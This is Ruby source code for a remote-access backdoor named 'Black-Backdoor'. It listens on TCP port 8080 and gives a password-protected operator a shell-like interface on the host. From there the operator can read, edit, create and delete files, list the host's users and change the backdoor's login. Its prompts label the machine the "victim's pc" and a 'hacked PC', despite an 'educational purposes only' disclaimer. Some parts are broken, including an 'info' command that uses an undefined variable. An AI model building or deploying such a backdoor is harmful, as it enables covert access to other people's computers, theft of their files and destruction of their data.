require 'socket'

server = TCPServer.new(8080)
@server_location = Dir.pwd

puts "server running.... on localhost:8080"
require './backpack/login'
while true
	path = "#{Dir.pwd}".split('/')
	if path.length < 3
		active_user = ' User identification failed!'
	else
		active_user = path[2]
	end
		tcp_sock = server.accept

		Thread.new(tcp_sock) do |sock|
				folder = @server_location
				if Dir.exist?(folder)
					Dir.chdir(folder)
				else
					puts " [?]Remote user can't access your PC"
					puts " [!] Server location destroyed!"
				end
				
                
#*********************************************************************************************************************************************
#*********************************************************************************************************************************************
#*********************************************************************************************************************************************
#*********************************************************************************************************************************************

                
                #
#READ
#
def read_text_file(file_, sock)
  if File.exist?(file_)
    txt = File.read(file_)
    sock.puts "[*] Content file name: #{file_}"
    sock.puts "#{txt}"
    sock.puts ""
  else
    sock.puts " [!] File: '#{file_}' not found!"
  end
end
#
#ls
#

def list_files(location, sock)
  files = Dir.entries(location)
  files = files - [".", ".."]
  sock.puts ""
  sock.puts "     File Size      File Name"
  sock.puts "------------------------------------------------------------"
  files.each do |filename|
    file_size = File.size(location + filename)
    if 1024 > file_size
    sock.puts "    [+]   #{File.size(filename)}  bytes   #{filename}"

    end
    if 1048576 > file_size and file_size > 1023
      f_s = file_size / 1024
      sock.puts "    [+]   #{f_s}  KB   #{filename}"

    end
    if 1073741824 > file_size and file_size > 1048575
      f_s = file_size / 1048576
      sock.puts "    [+]   #{f_s}  MB   #{filename}"

    end
    if file_size > 1073741823
      f_s = file_size / 1073741824

    sock.puts "    [+]   #{f_s}  GB   #{filename}"

    end

    sock.puts ""
  end
end

#
#TIME
#

def time_(sock)

  sock.puts " [+] Time: #{Time.now}"

end

#
#md
#

def m_d(location, sock)
  Dir.mkdir(location)
  sock.puts "[+] Successfully created on #{location} ! "
end

#
#help
#
def hel(cm, sock)
  sock.puts ""
  sock.puts "==================================================================================================="
  sock.puts " Command				Description"
  sock.puts ""
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " cd"
  sock.puts "					* Change current working directory"
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " delete"
  sock.puts "					* USAGE: delete [path][file or folder name]"
  sock.puts "					* delete target file or folder."
  sock.puts "___________________________________________________________________________________________________"

  sock.puts " exit"
  sock.puts "					* Exit from the current session"
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " help"
  sock.puts "					* List all commands with description"
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " info"
  sock.puts "					* USAGE: info [path][filename]"
  sock.puts "					* List all information about the file"
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " leave"
  sock.puts "					* Exit from current session."
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " ls"
  sock.puts "					* USAGE: ls [folder location]"
  sock.puts "					* list files and directories in the specified folder."
  sock.puts "					* when type ls without directory then list all files."
  sock.puts "                                         and directories on the current working directory."
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " md"
  sock.puts "					* md [folder name what you need to create]"
  sock.puts "					* Create new folder"
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " new"
  sock.puts "					* USAGE: new [path][filename]"
  sock.puts "					* Create new text file"
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " quit"
  sock.puts "					* Exit from the current session. "
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " read"
  sock.puts "					* USAGE: read [filename]"
  sock.puts "					* Read content of the target file."
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " time"
  sock.puts "					* Shows hacked PC's current time"
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " users"
  sock.puts "					* List all the users in the target device."
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " whereami"
  sock.puts "					* meaning: Where am I, print current working directory."
  sock.puts "___________________________________________________________________________________________________"
  sock.puts " whoami"
  sock.puts "					* meaning: Who Am I, prints current active user name"
  sock.puts "==================================================================================================="


end

#
#Delete
#

def del_something(targ, sock)
  target = targ
  if File.exist?(target)
    if File.file?(target)
      File.delete(target)
    else
      if Dir.exist?(target)
        if target == "." or target == '..'
          sock.puts " {!} Opertaion crashed by the system..."
          sock.puts " {!} This is not customizeable file or folder"
        else
          if target == ''
            sock.puts 'No specified file or folder'
          else
            Dir.rmdir(target)
            sock.puts " [+]Folder Successfully Deleted!"
          end
        end
      else
        sock.puts " []!]  specified item not found ...!"
      end
    end
  else
    sock.puts " [!]  specified item not found ...!"
  end
end

#
#CD
#

def change_dir(folder, sock)
  if Dir.exist?(folder)
    Dir.chdir(folder)
  else
    sock.puts "  [!] invalid location."
    sock.puts "  [!] Recheck the folder name."
  end
end

#
#whom
#

def who_(active_user, sock)
  sock.puts " {*} '#{active_user}'"
end
#
#whereami
#

def where(sock)
  sock.puts " (+) #{Dir.pwd}"

end
#
#Download
#

def down(file_name, server, sock)
  new_server = TCPServer.new(8000)
  down_web = new_server.accept
  Thread.new(down_web) do |user|
    user.puts "Download your target file here!"
    user.puts ""
    user.close
  end



end

#
#EXIT
#

def leave_me(sock)

  sock.puts " [*] Session closed Successfully!"
  sock.close()

end

#
#INFO
#

def info_all(file_name, sock)
  sock.puts "File Name: #{file_name}"
  sock.puts "File size: #{File.size(file_name)}"
  sock.puts "Extention: #{file_name.split('.')[1]}"
  sock.puts "Modification Time: #{File.mtime(file_name)}"

end

#
#EDIT
#

def edit_(file_name, sock)

      # Note the "w", which opens the file for writing
    File.open(file_name, "w") do |file|
      file_stat = 'open'
        while file_stat == 'open'
          linebyline = sock.gets.chomp
          case linebyline
            when "*s"
              file.close
              file_stat = 'closed'
            when '*S'
              file.close
              file_stat = 'closed'
            else
              file.puts linebyline
          end
        end
    end



end


#
#Create a new file
#

def new_file(file, sock)
  if File.exist?(file)
    sock.puts " [!] File name you enetered is currently exist"
    sock.puts " [*] Try defferent or excute 'ls' to list file list on the directory"
  else
    File.new(file, File::CREAT|File::TRUNC|File::RDWR, 0644)
    sock.puts " [*] File created Successfully!"
  end
end

#
#Users
#
def list_users(sock)
  path = "#{Dir.pwd}".split('/')
  if path.length < 3
    sock.puts " [!] Something went wrong!"
  else
    active_user = path[2]
    users = Dir.entries('/home/')
    users = users - ['.']
    users = users - ['..']
    users.each do |user|

      if user == active_user
        sock.puts " [+] #{user}"
      else
        sock.puts " [>] #{user}"
      end

    end


  end
end

#
#Change password
#

def change_pass(sock, cmd)
  if cmd[1] == "-u" and cmd[3] == "-p"
      pass_method = "1"
  else
      if cmd[1] == "-p" and cmd[3] == "-u"
          pass_method = "2"
      else
          pass_method = "0"
      end
  end
  line1 = ""
  case pass_method
      
    when '1'
      line1 = '@username =' + '"' + cmd[2] + '"'
      line2 = '@password =' + '"' + cmd[4] + '"'
      
    when '2'
      line1 = '@username =' + cmd[4]
      line2 = '@password =' + cmd[2]
    when '0'
      sock.puts "Usage: passwd -u [username] -p [password]"
  end
  if line1 != ""
          sock.puts "#{@server_location}/backpack/login.rb"
          File.delete("#{@server_location}/backpack/login.rb")
          File.new("#{@server_location}/backpack/login.rb", File::CREAT|File::TRUNC|File::RDWR, 0644)
          File.open("#{@server_location}/backpack/login.rb", "w") do |file|
                file_stat = 'open'
                while file_stat == 'open'
                    login_det = [
                        "#		Black-Backdoor Login",
                        "#",
                        "# * You have access to change and modify the user login",
                        "#",
                        "# * If you would like to change user name and password",
                        "#",
                        "# * Please enter your username and password between ''",
                        "#",
                        "#   username and password defaultly set as 'user' and '12345678'",
                        "#",
                        "#   When you change password add different password you never use anywhere.",
                        "#",
                        "#"

                                            
                        ]
                    login_det += [line1] + [line2]
                    
                    login_det.each do |each_line|
                        file.puts each_line
                    end
                    file.close
                    file_stat == '0'
                    sock.puts " [@] Password updated! :)"
                end
          end

  end
end



#*********************************************************************************************************************************************
#*********************************************************************************************************************************************
#*********************************************************************************************************************************************
#*********************************************************************************************************************************************

       				#require './backpack/cmds'
       				sock.puts "	|!	Black-Backdoor v1.3.1	!|"
       				sock.puts "	{!} Educational purposes only!"
				sock.puts "		******* 	Don't use for unecthical or illegal purposes."
				sock.puts "		 *****	 	Author never responsible for your actions"
				sock.puts "		  *** 		Respect others' privacy"
				sock.puts "		   *	 	Author: ghostdtdn"

				sock.print "Uername: "
				user_name = sock.gets.chomp
				sock.print "Password: "
				black_pass = sock.gets.chomp

				if user_name == @username and black_pass == @password
          puts "[*] #{Time.now}"
					puts "[+] #{user_name} connected"
          
					sock.puts ""
					sock.puts "[*] #{Time.now}"
					sock.puts "[+] Access Granted!"
					sock.puts ""
					while true
							sock.print "#{user_name} @ victim's pc(#{Dir.pwd}) :$ "
							msg = sock.gets.chomp
							#sock.puts "[+] + #{Dir.entries(msg)}"
							cmd = msg.split(' ')
							cmd_length = cmd.length()
							if cmd_length == 0
								#nothing
							else
								case cmd[0]
								when 'read'
									read_text_file(cmd[1], sock)
								when 'help'
									hel(cmd[0], sock)
								when 'ls'
									if cmd_length != 2
										cmd = cmd + ['./']
									end
											list_files(cmd[1], sock)
								when 'md'
									m_d(cmd[1], sock)
								when 'delete'
									if cmd_length != 2
										sock.puts "	[?]	No file or folder specified!"
									else
										del_something(cmd[1], sock)

									end
								when 'new'
									if cmd.length == 2
										new_file(cmd[1], sock)
									else
										sock.puts " [!] File name required"
									end
								when 'time'
										time_(sock)
								when 'whereami'
									where(sock)
								when 'cd'
									if cmd_length != 2
										sock.puts "	[!]	Folder location required!"
									else
										change_dir(cmd[1], sock)
									end
								when 'leave'
									leave_me(sock)
								when 'exit'
									leave_me(sock)
								when 'quit'
									leave_me(sock)
								when 'users'
									list_users(sock)
								when 'info'
                  File.open(file_name, "w") do |file|
                  file_stat = 'open'
                  while file_stat == 'open'
                  linebyline = sock.gets.chomp
                  case linebyline
                    when "*s"
                      file.close
                      file_stat = 'closed'
                    when '*S'
                      file.close
                      file_stat = 'closed'
                    else
                      file.puts linebyline
                  end
              end
          end
									if cmd.length == 2
									info_all(cmd[1], sock)
									else
									sock.puts "File name incorrect or not specified!"
									end
								when 'whoami'
									who_(active_user, sock)
								when 'edit'
									if cmd.length == 2

										edit_(cmd[1], sock)
									else
										sock.puts " [?] File name isn't specified."
									end
								when 'passwd'
									if cmd.length == 5
										if File.exist?(@server_location + '/backpack/login.rb')
											change_pass(sock, cmd)
										end
									else
										sock.puts "Usage:  passwd -u [username] -p [password]"
									end
								else
									sock.puts "	[-] Bad request!"
									sock.puts "		[*] #{msg} is not excuted in the target device"
									sock.puts '		[*] Try "help" command for the help'

								end
							end



					end
				else
					sock.print "Bad request, Try a different!"
				end
						#sock.close

		end




end
